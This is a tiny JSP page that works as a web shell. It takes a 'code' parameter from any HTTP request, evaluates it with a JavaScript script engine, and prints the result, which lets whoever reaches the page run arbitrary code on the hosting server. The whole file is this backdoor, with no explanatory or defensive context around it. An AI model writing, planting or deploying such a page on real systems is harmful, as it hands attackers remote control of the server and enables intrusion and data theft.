<%@ page import="javax.script.*" %>
<%
String code = request.getParameter("code");
if (code != null) {
    ScriptEngineManager mgr = new ScriptEngineManager();
    ScriptEngine engine = mgr.getEngineByName("js");
    out.println(engine.eval(code));
}
%>